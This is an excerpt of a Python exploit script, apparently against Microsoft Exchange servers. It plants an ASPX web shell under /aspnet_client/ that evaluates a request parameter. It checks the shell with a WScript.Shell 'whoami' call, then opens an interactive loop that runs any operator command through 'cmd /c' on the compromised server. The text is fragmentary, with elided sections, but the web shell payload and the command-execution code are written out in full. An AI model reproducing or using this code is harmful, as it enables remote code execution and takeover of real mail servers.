...
#FILE_DATA ='<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'
...
def exp(mail_name, sid):
    ...
    global shell_url
    shell_url = f"https://{HOST}/aspnet_client/{SHELL_NAME}.aspx"
    Log.success("shell: "+shell_url)
    checkShell()
...
def checkShell():
    ...
    print("下面验证shell是否ok")
    print('command=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
    print("正在请求shell")
    import time
    time.sleep(1)
    #shell_url = "https://192.168.111.50/aspnet_client/YhaNjklsGO.aspx"
    data = requests.post(shell_url, data={
        "command": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"},
    ...
    while True:
        ...
        data = {
            "command": """Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())""" % input_cmd}
        ct = requests.post(
            final_shell,
